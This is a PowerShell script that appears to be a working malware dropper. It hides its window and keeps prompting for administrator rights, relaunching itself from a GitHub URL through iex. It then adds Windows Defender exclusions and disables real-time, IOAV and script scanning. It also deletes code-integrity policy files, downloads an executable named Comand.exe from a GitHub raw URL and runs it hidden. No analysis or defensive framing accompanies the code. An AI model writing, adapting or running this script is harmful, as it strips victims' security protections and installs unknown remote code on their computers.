# Hide Console Window
Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
$w = [C.W]::GetConsoleWindow()
if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }

# ============ SELF-URL (relaunch point when executed via iex from web) ============
$self = "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1"

# ============ ADMIN CHECK ============
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ============ RELAUNCH TARGET (works from disk AND from iex URL) ============
$relaunch = if ($PSCommandPath) { "-File `"$PSCommandPath`"" } else { "-c iex((New-Object Net.WebClient).DownloadString('$self'))" }

# ============ ELEVATION LOOP: retry until admin granted, never crash ============
while (-not $isAdmin) {
    try {
        Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass $relaunch" -ErrorAction Stop
        break
    } catch {
        Start-Sleep -Seconds 2
    }
}

if (-not $isAdmin) { exit }

# ============ ADMIN GRANTED: WORK (all silent, no errors to console) ============
try {
    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:TEMP\Comand.exe" -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

    Remove-Item -LiteralPath "$((Get-Partition | ? IsSystem).AccessPaths[0])Microsoft\Boot\WiSiPolicy.p7b" -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath "$env:windir\System32\CodeIntegrity\WiSiPolicy.p7b" -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath "$env:windir\Boot\EFI\wisipolicy.p7b" -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:windir\WinSxS" -Include *winsipolicy.p7b* -Recurse -ErrorAction SilentlyContinue

    $path = Get-Item $env:TEMP
    $folder = $path.FullName
    Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue

    Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile "$folder\Comand.exe" -ErrorAction SilentlyContinue
    Start-Process -FilePath "$folder\Comand.exe" -WindowStyle Hidden
} catch {}
